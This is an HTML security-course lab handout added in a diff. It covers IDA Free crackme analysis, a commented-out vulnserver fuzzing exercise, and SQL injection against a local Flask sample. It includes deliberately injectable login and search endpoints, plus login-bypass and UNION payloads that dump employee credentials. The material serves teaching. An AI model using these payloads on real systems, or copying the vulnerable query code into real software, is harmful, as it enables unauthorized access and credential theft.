@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Reverse Engineering and Fuzzing Lab</title>
+  <style>
+    :root {
+      --bg: #f6f8fb;
+      --card: #ffffff;
+      --text: #1f2937;
+      --muted: #6b7280;
+      --primary: #2563eb;
+      --primary-dark: #1e40af;
+      --accent: #10b981;
+      --warning: #f59e0b;
+      --danger: #ef4444;
+      --code-bg: #111827;
+      --code-text: #e5e7eb;
+      --border: #e5e7eb;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      line-height: 1.6;
+      background: var(--bg);
+      color: var(--text);
+    }
+
+    header {
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      color: white;
+      padding: 48px 24px;
+      text-align: center;
+    }
+
+    header h1 {
+      margin: 0 0 12px;
+      font-size: 2.3rem;
+      letter-spacing: -0.03em;
+    }
+
+    header p {
+      margin: 0 auto;
+      max-width: 850px;
+      color: #dbeafe;
+      font-size: 1.05rem;
+    }
+
+    .container {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 32px 20px 64px;
+    }
+
+    .note {
+      background: #eff6ff;
+      border-left: 5px solid var(--primary);
+      padding: 16px 18px;
+      border-radius: 10px;
+      margin-bottom: 28px;
+    }
+
+    .note strong {
+      color: var(--primary-dark);
+    }
+
+    .toc {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 22px;
+      margin-bottom: 32px;
+      box-shadow: 0 8px 20px rgba(15, 23, 42, 0.06);
+    }
+
+    .toc h2 {
+      margin-top: 0;
+      font-size: 1.25rem;
+    }
+
+    .toc ul {
+      margin: 0;
+      padding-left: 22px;
+    }
+
+    .toc a {
+      color: var(--primary-dark);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .toc a:hover {
+      text-decoration: underline;
+    }
+
+    section.question {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 18px;
+      padding: 28px;
+      margin-bottom: 36px;
+      box-shadow: 0 10px 24px rgba(15, 23, 42, 0.07);
+    }
+
+    section.question > h2 {
+      margin-top: 0;
+      padding-bottom: 12px;
+      border-bottom: 2px solid var(--border);
+      color: var(--primary-dark);
+      font-size: 1.75rem;
+    }
+
+    article.step {
+      margin: 28px 0;
+      padding: 20px;
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      background: #fbfdff;
+    }
+
+    article.step h3 {
+      margin-top: 0;
+      color: #111827;
+      font-size: 1.22rem;
+    }
+
+    .tag {
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 999px;
+      background: #dbeafe;
+      color: var(--primary-dark);
+      font-size: 0.78rem;
+      font-weight: 700;
+      margin-right: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    .screenshot {
+      background: #fff7ed;
+      border-left: 5px solid var(--warning);
+      padding: 12px 14px;
+      border-radius: 10px;
+      margin-top: 14px;
+      font-weight: 600;
+    }
+
+    .optional {
+      background: #f0fdf4;
+      border-left: 5px solid var(--accent);
+      padding: 12px 14px;
+      border-radius: 10px;
+      margin-top: 14px;
+      font-weight: 600;
+    }
+
+    code.inline-code {
+      background: #eef2ff;
+      color: #3730a3;
+      padding: 2px 6px;
+      border-radius: 6px;
+      font-family: Consolas, Monaco, 'Courier New', monospace;
+      font-size: 0.95em;
+    }
+
+    pre {
+      background: var(--code-bg);
+      color: var(--code-text);
+      padding: 16px 18px;
+      border-radius: 12px;
+      overflow-x: auto;
+      margin: 14px 0;
+      border: 1px solid #374151;
+    }
+
+    pre code {
+      font-family: Consolas, Monaco, 'Courier New', monospace;
+      font-size: 0.95rem;
+      line-height: 1.55;
+    }
+
+    .file-list {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 12px;
+      margin: 14px 0;
+    }
+
+    .file-item {
+      background: #f9fafb;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 12px;
+      font-family: Consolas, Monaco, 'Courier New', monospace;
+      font-weight: 700;
+      color: #374151;
+    }
+
+    .warning-box {
+      background: #fef2f2;
+      border-left: 5px solid var(--danger);
+      padding: 16px 18px;
+      border-radius: 10px;
+      margin: 22px 0;
+    }
+
+    .warning-box strong {
+      color: #991b1b;
+    }
+
+    footer {
+      text-align: center;
+      color: var(--muted);
+      padding: 24px;
+      font-size: 0.92rem;
+    }
+
+    @media print {
+      body {
+        background: white;
+      }
+
+      header {
+        background: white;
+        color: black;
+        border-bottom: 2px solid #000;
+      }
+
+      header p {
+        color: black;
+      }
+
+      section.question,
+      .toc,
+      article.step {
+        box-shadow: none;
+        break-inside: avoid;
+      }
+
+      pre {
+        white-space: pre-wrap;
+        word-break: break-word;
+      }
+    }
+  </style>
+</head>
+<body>
+  
+  <main class="container">
+    <div class="warning-box">
+        <strong>Important:</strong> Below the questions, please answer them in a Word file. After the lesson, I will send you the submission link. Rename the file look like: fullname_lab2_code. Please submit <strong>pdf file</strong>
+      </div>
+    <section id="question-1" class="question">
+      <h2>Question 1: Performing Reverse Engineering with IDA Free</h2>
+
+      <article class="step">
+        <h3><span class="tag">Step 1.1</span>Install IDA Free on Kali Linux</h3>
+        <p>Download the IDA Free installer file from <a href="https://hex-rays.com/ida-free">https://hex-rays.com/ida-free</a> request it with your email to get a free licence.</p>
+        <p>Rename the downloaded file to <i>idafree.run</i></p>
+        <p>Grant execution permission:</p>
+        <pre><code>sudo chmod +x ./Downloads/idafree.run</code></pre>
+        <p>Run the installer:</p>
+        <pre><code>./Downloads/idafree.run</code></pre>
+        <p>Follow the installation instructions. IDA Free will be installed in the user's home directory.</p>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 1.2</span>Run the crackme Program on Kali</h3>
+        <p>Go to the <a href="https://crackmes.one/crackme/5eae2d6633c5d47611746500">Crackme</a> site, download and unzip it with the password:</p>
+        <pre><code>crackmes.one</code></pre>
+        <p>After extraction, you will get a zip file named <code class="inline-code">easyAF</code> , unzip it again, the executable file you will get named </p>
+        <div class="file-list">
+          <div class="file-item">easyAF</div>
+        </div>
+        <p>Run <code class="inline-code">easyAF</code> in the Linux CMD environment</p>
+        First, you need to check where the file is stored. Go to that folder and run
+        <pre><code>./easyAF</code></pre>
+        <p>Enter to run. It will ask you the password. Just type anything you want because you don't know the password right now.</p>
+        What did you get?
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 1.3</span>Open and search on IDA Free</h3>
+        <p>Open IDA Free on Kali Linux and load the <code class="inline-code">easyAF</code> file.</p>
+        <p>In IDA Free, go to:</p>
+        <pre><code>Search → Text</code></pre>
+        <p>Search for the keyword:</p>
+        <pre><code>password</code></pre>
+        <p>In the <code class="inline-code">IDA - View A</code> window, select:</p>
+        <pre><code>Fit window</code></pre>
+        <p>Use either <code class="inline-code">Text view</code> or <code class="inline-code">Graph view</code> to view the Assembly code of the program.</p>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 1.4</span>Generate Pseudocode</h3>
+        <p>In IDA Free, go to:</p>
+        <pre><code>View → Subviews → Generate pseudocode</code></pre>
+        <p>In the <code class="inline-code">Pseudocode - A</code> window, use <code class="inline-code">Synchronize with</code> to synchronize it with (right-click -> synchronize with -> IDA - View A or IDA - View B):</p>
+        
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 1.6</span>Analyze the Pseudocode</h3>
+        <p>Analyze the pseudocode of <code class="inline-code">crackme.exe</code> to determine the correct input that makes the program print the following message:</p>
+        <pre><code>Welldone!</code></pre>
+        <p>Then run <code class="inline-code">easyAF</code> in the Linux CMD environment and make sure the message above is displayed.</p>
+        <div class="screenshot">Take screenshots to demonstrate your results.</div>
+      </article>
+
+      
+
+    <!-- <section id="question-2" class="question">
+      <h2>Question 2: Performing Fuzzing with Spike</h2>
+
+      <div class="warning-box">
+        <strong>Important:</strong> Perform this lab only in a controlled lab environment. Do not run fuzzing activities against systems that you do not own or do not have permission to test.
+      </div>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.1</span>Prepare Netcat on Windows</h3>
+        <p>Install <code class="inline-code">nmap</code>, which includes <code class="inline-code">ncat</code>, on the Windows machine.</p>
+        <p>Turn off the Windows Firewall for this lab environment.</p>
+        <p>Start a Netcat service in Windows CMD:</p>
+        <pre><code>ncat -vklp 9000</code></pre>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.2</span>Configure Kali Linux Networking</h3>
+        <p>Change the network configuration of the Kali Linux virtual machine so that it can communicate with the Windows machine.</p>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.3</span>Create the First Spike Script</h3>
+        <p>On Kali Linux, create a file named:</p>
+        <pre><code>simple1.spk</code></pre>
+        <p>Use the following command:</p>
+        <pre><code>nano simple1.spk</code></pre>
+        <p>Add the following content:</p>
+        <pre><code>s_string("Hello, world!");</code></pre>
+        <p>Save the file.</p>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.4</span>Fuzz the Netcat Service Using simple1.spk</h3>
+        <p>Run the following command on Kali Linux:</p>
+        <pre><code>generic_send_tcp &lt;Windows_IP_Address&gt; 9000 simple1.spk 0 0</code></pre>
+        <p>Observe the result received by the Netcat service on Windows.</p>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.5</span>Create the Second Spike Script</h3>
+        <p>Create another file named:</p>
+        <pre><code>simple2.spk</code></pre>
+        <p>Use the following command:</p>
+        <pre><code>nano simple2.spk</code></pre>
+        <p>Add the following content:</p>
+        <pre><code>s_string_variable("Hello, world!");</code></pre>
+        <p>Save the file.</p>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.6</span>Fuzz the Netcat Service Using simple2.spk</h3>
+        <p>Run the following command:</p>
+        <pre><code>generic_send_tcp &lt;Windows_IP_Address&gt; 9000 simple2.spk 0 0</code></pre>
+        <p>Observe the result received by the Netcat service on Windows.</p>
+        <div class="screenshot">Take screenshots to demonstrate your results.</div>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.7</span>Run vulnserver on Windows</h3>
+        <p>Download and extract:</p>
+        <pre><code>Lab03.zip</code></pre>
+        <p>You will get a folder named:</p>
+        <pre><code>vulnserver</code></pre>
+        <p>Run the following file in Windows CMD:</p>
+        <pre><code>vulnserver.exe</code></pre>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.8</span>Connect to vulnserver from Kali Linux</h3>
+        <p>On Kali Linux, connect to the Windows vulnserver service:</p>
+        <pre><code>nc &lt;Windows_IP_Address&gt; 9999</code></pre>
+        <p>After connecting, test the following commands:</p>
+        <pre><code>HELP
+EXIT</code></pre>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.9</span>Create the TRUN Spike Script</h3>
+        <p>Create a file named:</p>
+        <pre><code>trun.spk</code></pre>
+        <p>Use the following command:</p>
+        <pre><code>nano trun.spk</code></pre>
+        <p>Add the following content:</p>
+        <pre><code>s_readline();
+s_string("TRUN ");
+s_string_variable("COMMAND");</code></pre>
+        <p>Save the file.</p>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.10</span>Fuzz the vulnserver Service</h3>
+        <p>Run the following command on Kali Linux:</p>
+        <pre><code>generic_send_tcp &lt;Windows_IP_Address&gt; 9999 trun.spk 0 0</code></pre>
+        <p>Observe the result. The <code class="inline-code">vulnserver</code> service should stop working after a short period of time.</p>
+        <div class="screenshot">Take screenshots to demonstrate your results.</div>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.11</span>Use Immunity Debugger to Observe the Crash</h3>
+        <p>Install Immunity Debugger on the Windows machine.</p>
+        <p>Open and run the following file using Immunity Debugger:</p>
+        <pre><code>vulnserver.exe</code></pre>
+        <p>Then continue fuzzing the <code class="inline-code">vulnserver</code> service from Kali Linux.</p>
+        <p>Observe the Immunity Debugger interface. You should see that the <code class="inline-code">EIP</code> register contains the value:</p>
+        <pre><code>41414141</code></pre>
+        <p>This indicates a buffer overflow vulnerability.</p>
+        <div class="screenshot">Take screenshots to demonstrate your results.</div>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.12</span>Optional Task</h3>
+        <p>Exploit the buffer overflow vulnerability in <code class="inline-code">vulnserver.exe</code> by following the provided instructions.</p>
+        <div class="optional">This part is optional.</div>
+      </article>
+    </section> -->
+    <section id="question-3" class="question">
+      <h2>Question 2: SQL Injection with Python</h2>
+
+      <div class="warning-box">
+        <strong>Important:</strong> Perform this activity only on the provided local sample project. Do not test SQL injection against real websites, public services, or systems without explicit permission.
+      </div>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.1</span>Download the Sample Project</h3>
+        <p>Download the sample project to your local machine from GitHub. You may choose one of the following options.</p>
+        <p><strong>Option 1: Clone the repository using Git</strong></p>
+        <p>If Git is installed on your computer, run this command in PowerShell or a terminal:</p>
+        <pre><code>git clone https://github.com/khanhtran2711/491b3a.git</code></pre>
+        <p>Then open the project folder in Visual Studio Code.</p>
+        <p><strong>Option 2: Download the ZIP file</strong></p>
+        <p>Download the project as a ZIP file from GitHub, unzip it, and open the extracted folder in Visual Studio Code.</p>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.2</span>Install the Required Dependencies</h3>
+        <p>Open the terminal in Visual Studio Code:</p>
+        <pre><code>View → Terminal</code></pre>
+        <p>Or use the shortcut:</p>
+        <pre><code>Ctrl + `</code></pre>
+        <p>Install the <code class="inline-code">virtualenv</code> package:</p>
+        <pre><code>pip install virtualenv</code></pre>
+        <p>Create a virtual environment inside the project directory. You may replace <code class="inline-code">my_env</code> with your preferred environment name:</p>
+        <pre><code>virtualenv my_env</code></pre>
+        <p>Activate the virtual environment on Windows:</p>
+        <pre><code>.\my_env\Scripts\activate</code></pre>
+        <p>Install Flask, a lightweight Python web framework:</p>
+        <pre><code>pip install flask</code></pre>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.3</span>Insert the Vulnerable API Functions</h3>
+        <p>The attack will target two use cases: <code class="inline-code">login</code> and <code class="inline-code">search item</code>.</p>
+        <p>In <code class="inline-code">main.py</code>, insert each function after this line:</p>
+        <pre><code>#typical functions</code></pre>
+        <p>and before this line:</p>
+        <pre><code>#error handler redirection</code></pre>
+
+        <p><strong>Login handling function:</strong></p>
+        <pre><code>@app.route(&#x27;/api/v1.0/storeLoginAPI/&#x27;, methods=[&#x27;POST&#x27;])
+def loginAPI():
+    if request.method == &#x27;POST&#x27;:
+        uname, pword = (request.json[&#x27;username&#x27;], request.json[&#x27;password&#x27;])
+        g.db = connect_db()
+        cur = g.db.execute(&quot;SELECT * FROM employees WHERE username = &#x27;%s&#x27; AND password = &#x27;%s&#x27;&quot; %(uname, hash_pass(pword)))
+        if cur.fetchone():
+            result = {&#x27;status&#x27;: &#x27;success&#x27;}
+        else:
+            result = {&#x27;status&#x27;: &#x27;fail&#x27;}
+        g.db.close()
+        return jsonify(result)</code></pre>
+
+        <p><strong>Search item handling function:</strong></p>
+        <pre><code>@app.route(&#x27;/api/v1.0/storeAPI/&lt;item&gt;&#x27;, methods=[&#x27;GET&#x27;])
+def searchAPI(item):
+    g.db = connect_db()
+    curs = g.db.execute(&quot;SELECT * FROM shop_items WHERE name = &#x27;%s&#x27;&quot; %item)
+    results = [dict(name=row[0], quantity=row[1], price=row[2]) for row in curs.fetchall()]
+    g.db.close()
+    return jsonify(results)</code></pre>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.4</span>Run the Project</h3>
+        <p>Execute the project using the following command:</p>
+        <pre><code>python main.py</code></pre>
+        <p>The terminal should display output similar to a Flask development server message, including links such as:</p>
+        <pre><code>* Serving Flask app 'main'
+* Debug mode: off
+* Running on http://127.0.0.1:5000
+* Running on http://&lt;your-local-ip&gt;:5000
+Press CTRL+C to quit</code></pre>
+        <p>Click one of the displayed links to open the webpage in your browser.
+
+          <img src="homepage.png" alt="" style="max-width: 100%;">
+        </p>
+        
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.5</span>Test the Login Functionality</h3>
+        <p>Select <code class="inline-code">Login</code> on the navigation bar.</p>
+        <p>Perform a successful and legitimate login using this sample account:</p>
+        <pre><code>Username: newguy29
+Password: pass123</code></pre>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.6</span>Perform SQL Injection on the Login Form</h3>
+        <p>Test for SQL injection in the login form by entering one of the following payloads into the <code class="inline-code">username</code> field. Leave the password field empty. You may try all payloads for comparison.</p>
+        <pre><code>&#x27; or 1 = 1 or &#x27;&#x27; = &#x27;
+&#x27; or 1=1 --
+&quot; or 1=1 --
+admin&#x27; --</code></pre>
+        <div class="screenshot">Take screenshots to demonstrate your results.</div>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Discussion</span>Login Attack Analysis</h3>
+        <p>Answer the following questions:</p>
+        <ol>
+          <li>Which security objective within the CIA triad does this attack compromise?</li>
+          <li>Propose a solution to resolve this issue.</li>
+        </ol>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.7</span>Test the Search Functionality</h3>
+        <p>Select <code class="inline-code">Search</code> on the navigation bar.</p>
+        <p>Perform a legitimate search using product names such as:</p>
+        <pre><code>water
+juice
+candy</code></pre>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Step 2.8</span>Perform SQL Injection on the Search Form</h3>
+        <p>Test for SQL injection in the search form using the following payloads in top-down order:</p>
+        <pre><code># Check if it can work
+juice&#x27; UNION SELECT 1,2,3 from sqlite_master WHERE type=&quot;table&quot;; --
+
+# Get names of tables from the master table
+# sqlite_master stores schema information about tables
+juice&#x27; UNION SELECT name,sql,3 from sqlite_master WHERE type=&quot;table&quot;; --
+
+# Get information from two columns and add a third placeholder column
+juice&#x27; UNION SELECT username,password,3 from employees;--</code></pre>
+        <p>After executing all three queries above, identify the anomaly.</p>
+        <div class="screenshot">Take screenshots to demonstrate your results.</div>
+      </article>
+
+      <article class="step">
+        <h3><span class="tag">Discussion</span>Search Attack Analysis</h3>
+        <p>Answer the following questions:</p>
+        <ol>
+          <li>Which security objective within the CIA triad does this attack compromise?</li>
+          <li>Propose a solution to resolve this issue.</li>
+        </ol>
+      </article>
+    </section>
+  </main>
+
+  <footer>
+    Reverse Engineering lab.
+  </footer>
+</body>
+</html>
